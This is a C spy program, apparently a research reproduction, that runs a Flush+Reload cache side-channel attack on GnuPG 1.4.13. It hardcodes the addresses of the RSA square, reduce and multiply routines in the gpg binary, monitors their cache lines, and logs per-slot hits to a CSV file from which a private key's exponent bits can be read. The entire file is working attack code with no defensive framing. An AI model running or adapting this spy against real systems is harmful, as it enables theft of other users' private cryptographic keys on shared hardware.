#include "fr/fr.h"

//0xbb9e5 first cache line
//0xbba00 second cache line
#define RSA_SQUARE (void*) 0xbb9e5

//0xbaf9f first cache line
//0xbafc0 second cache line (only this one appears to work)
#define RSA_REDUCE (void*) 0xbafc0

//0xbb367 first cache line
//0xbb380 second cache line
#define RSA_MULTIPLY (void*) 0xbb367 

#define RSA_SQUARE_IDX 0
#define RSA_REDUCE_IDX 1
#define RSA_MULTIPLY_IDX 2

int main(int argc, char** argv) {

	FR fr = fr_init( 2048*50, RSA_SQUARE, RSA_REDUCE, RSA_MULTIPLY);

	fr.hit_begin=0;
	fr.hit_end=230;
	//fr_calibrate(&fr, 1.0, 1000000, "scripts/calibration.csv");

	fr_monitor_elf(&fr, "gnupg-1.4.13/g10/gpg");

	FILE* file = fopen("spy.csv", "w");

	// create csv
	fprintf(file, "square,reduce,multiply\n");
	for(unsigned int i=0; i < fr.num_time_slots; i++) {

		fprintf(file, "%u,%u,%u\n",
				fr.results[i * fr.len + RSA_SQUARE_IDX],
				fr.results[i * fr.len + RSA_REDUCE_IDX],
				fr.results[i * fr.len + RSA_MULTIPLY_IDX]);
	}

	fclose(file);

	return 0;
}
